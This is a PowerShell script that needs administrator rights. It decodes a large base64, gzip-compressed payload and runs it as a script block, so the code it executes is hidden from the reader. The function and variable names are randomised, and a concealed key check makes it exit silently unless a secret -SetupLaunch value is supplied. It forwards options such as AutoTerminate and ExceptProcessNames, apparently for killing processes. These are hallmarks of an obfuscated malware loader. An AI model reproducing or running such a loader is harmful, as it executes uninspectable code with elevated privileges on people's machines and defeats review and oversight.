#Requires -RunAsAdministrator


function dlquomkrva {
    param([string[]]$Data)
    $bytes = [Convert]::FromBase64String(($Data -join ''))
    $vymzpvkqzq = New-Object System.IO.MemoryStream (,$bytes)
    $hbtjnmhquo = New-Object System.IO.Compression.GZipStream(
        $vymzpvkqzq,
        [System.IO.Compression.CompressionMode]::Decompress
    )
    $kobyzfvtjs = New-Object System.IO.StreamReader($hbtjnmhquo, [System.Text.Encoding]::UTF8)
    $vodwwrjpkh = $kobyzfvtjs.ReadToEnd()
    $kobyzfvtjs.Close(); $hbtjnmhquo.Close(); $vymzpvkqzq.Close()
    return $vodwwrjpkh
}

function rcpzmiqhvv {
    param([object[]]$Tokens)

    $knownSwitches = @('SkipBuiltinExclusions', 'AutoTerminate')
    $knownArrays = @('States', 'ExceptProcessNames')
    $splat = @{}
    $n = 0

    while ($n -lt $Tokens.Count) {
        $t = [string]$Tokens[$n]
        if ($t -match '^-([^:/]+)$' -and $t -notmatch '^--') {
            $key = $Matches[1]
            $next = if ($n + 1 -lt $Tokens.Count) { [string]$Tokens[$n + 1] } else { $null }
            if ($null -eq $next -or ($next -match '^-')) {
                if ($knownSwitches -contains $key) {
                    $splat[$key] = $true
                }
                $n++
            } elseif ($knownArrays -contains $key) {
                $values = ($next -split ',\s*' | Where-Object { $_ })
                if ($values) { $splat[$key] = $values }
                $n += 2
            } else {
                $n += 2
            }
        } else {
            $n++
        }
    }

    return $splat
}

function ufzlyinrtf {
    param([object[]]$Tokens)

    $expected = [System.Text.Encoding]::UTF8.GetString(
        [Convert]::FromBase64String('RFJDLUE3RjMtOUMyRS00QjgxLTZEMEYtOEU1QTFDOUIzRDcy')
    )
    $provided = $null
    $rest = New-Object System.Collections.Generic.List[object]
    $n = 0

    while ($n -lt $Tokens.Count) {
        $t = [string]$Tokens[$n]
        if ($t -eq '-SetupLaunch' -and ($n + 1) -lt $Tokens.Count) {
            $provided = [string]$Tokens[$n + 1]
            $n += 2
            continue
        }
        [void]$rest.Add($Tokens[$n])
        $n++
    }

    if ([string]::IsNullOrWhiteSpace($provided) -or $provided -cne $expected) {
        exit 0
    }

    return $rest.ToArray()
}

$uytzgqgrnx = @(
    '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',
    'I9uiG5Uc0SIYJ1agoggP3TCj0ft/FVttzWOeAAA='
)

$bdaiotnydw = dlquomkrva -Data $uytzgqgrnx
$wjapyolgwg = [ScriptBlock]::Create($bdaiotnydw)
$lwbaqgyype = ufzlyinrtf -Tokens $args
$tyjrbxoqdi = rcpzmiqhvv -Tokens $lwbaqgyype
if ($tyjrbxoqdi.Count -gt 0) {
    & $wjapyolgwg @tyjrbxoqdi
} else {
    & $wjapyolgwg
}
